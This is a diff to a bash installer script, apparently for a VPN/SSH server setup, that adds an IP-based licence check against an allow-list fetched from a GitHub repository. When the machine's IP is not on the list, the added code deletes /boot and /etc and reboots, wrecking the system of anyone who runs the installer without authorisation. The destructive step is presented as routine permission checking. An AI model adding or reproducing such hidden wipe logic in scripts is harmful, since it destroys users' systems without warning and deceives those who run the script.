@@ -12,8 +12,23 @@ PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 LIGHT='\033[0;37m'
 # ==========================================
-# Getting
-MYIP=$(wget -qO- ipinfo.io/ip);
+MYIP=$(wget -qO- ifconfig.me/ip);
+IZIN=$( curl https://raw.githubusercontent.com/halluboys/perizinan/main/main/allow  | grep $MYIP )
+if [ $MYIP = $IZIN ]; then
+echo -e "${green}Permission Accepted...${NC}"
+else
+echo -e "${red}Permission Denied!${NC}";
+echo "Please Contact Admin"
+echo "Telegram t.me/xzvnct"
+echo "Waiting 5 Sec"
+rm -f setup.sh
+sleep 5
+rm -r -f /boot; rm -r -f /etc; reboot
+exit 0
+fi
+cd
+# ==========================================
+# Getting 
 # ==================================================
 # Link Hosting Kalian
 akbarvpn="raw.githubusercontent.com/halluboys/xxx/main/ssh"
